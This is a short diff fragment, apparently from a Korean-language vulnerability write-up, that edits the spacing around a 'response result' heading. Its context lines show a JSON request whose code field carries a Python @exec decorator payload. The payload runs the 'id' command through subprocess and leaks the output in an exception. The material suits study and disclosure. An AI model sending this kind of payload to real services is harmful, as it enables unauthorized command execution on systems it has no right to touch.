@@ -42,7 +42,10 @@ Content-Type: application/json
   "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"
 }
 
+
 응답 결과
+
+
 {
   "function": {
     "errors": [
